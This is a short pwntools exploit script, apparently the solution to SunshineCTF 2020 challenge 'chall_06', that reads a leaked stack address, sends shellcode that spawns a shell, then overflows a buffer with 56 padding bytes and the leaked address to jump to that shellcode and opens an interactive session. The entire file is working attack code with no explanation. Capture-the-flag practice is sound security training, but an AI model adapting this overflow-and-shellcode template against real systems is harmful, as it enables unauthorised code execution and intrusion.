from pwn import *

binary = context.binary = ELF('./chall_06')

if not args.REMOTE:
    p = process(binary.path)
else:
    p = remote('chal.2020.sunshinectf.org', 30006)

p.recvuntil('Letting my armor fall again: ')
_ = p.recvline().strip()
stack = int(_,16)
log.info('stack: ' + hex(stack))

payload  = b''
payload += asm(shellcraft.sh())

p.sendline(payload)

payload  = b''
payload += 56 * b'A'
payload += p64(stack)

p.sendlineafter('For saving me from all they\'ve taken.\n',payload)
p.interactive()
